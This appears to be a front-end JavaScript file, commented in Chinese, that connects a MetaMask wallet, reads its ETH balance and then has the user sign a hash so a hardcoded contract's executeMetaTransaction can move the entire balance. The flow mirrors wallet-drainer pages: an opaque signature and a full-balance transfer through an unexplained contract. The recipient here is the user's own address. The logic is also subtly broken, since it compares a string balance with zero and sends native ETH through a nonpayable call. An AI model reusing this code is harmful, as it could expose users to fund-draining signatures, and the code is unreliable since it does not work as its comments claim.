let web3;
let userAddress;

async function connectWallet() {
    if (window.ethereum) {
        try {
            // 请求连接钱包
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            
            // 显示已连接钱包信息
            const walletInfo = document.getElementById('walletInfo');
            walletInfo.innerText = `已连接钱包: ${userAddress}`;
            walletInfo.classList.remove('hidden');
            document.getElementById('signButton').classList.remove('hidden');

            // 获取并显示钱包余额
            const balance = await getEthBalance(userAddress);
            walletInfo.innerText += `\n余额: ${balance} ETH`;

        } catch (error) {
            console.error("连接钱包失败:", error);
        }
    } else {
        alert('请安装 MetaMask!');
    }
}

async function getEthBalance(address) {
    const balance = await web3.eth.getBalance(address);
    return web3.utils.fromWei(balance, 'ether');
}

async function signAndSend() {
    const recipient = userAddress; // 使用当前连接的钱包地址作为接收者地址
    const balance = await getEthBalance(userAddress); // 获取钱包余额并将其全部转移

    // 检查余额是否足够
    if (balance <= 0) {
        alert('余额不足，无法转移');
        return;
    }

    // 生成签名消息
    const messageHash = web3.utils.keccak256(web3.utils.soliditySha3(userAddress, recipient, balance));
    const signature = await web3.eth.personal.sign(messageHash, userAddress);

    const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 替换为您的合约地址
    const contract = new web3.eth.Contract([
        {
            "constant": false,
            "inputs": [
                { "name": "sender", "type": "address" },
                { "name": "recipient", "type": "address" },
                { "name": "amount", "type": "uint256" },
                { "name": "signature", "type": "bytes" }
            ],
            "name": "executeMetaTransaction",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ], contractAddress);

    try {
        // 执行元交易并转移全部余额
        await contract.methods.executeMetaTransaction(userAddress, recipient, web3.utils.toWei(balance, 'ether'), signature).send({ from: userAddress });
        alert('元交易成功发送，余额已转移');
    } catch (error) {
        console.error("元交易发送失败:", error);
    }
}

document.getElementById('connectWalletButton').onclick = async () => {
    web3 = new Web3(window.ethereum);
    await connectWallet();
};

document.getElementById('signButton').onclick = signAndSend;
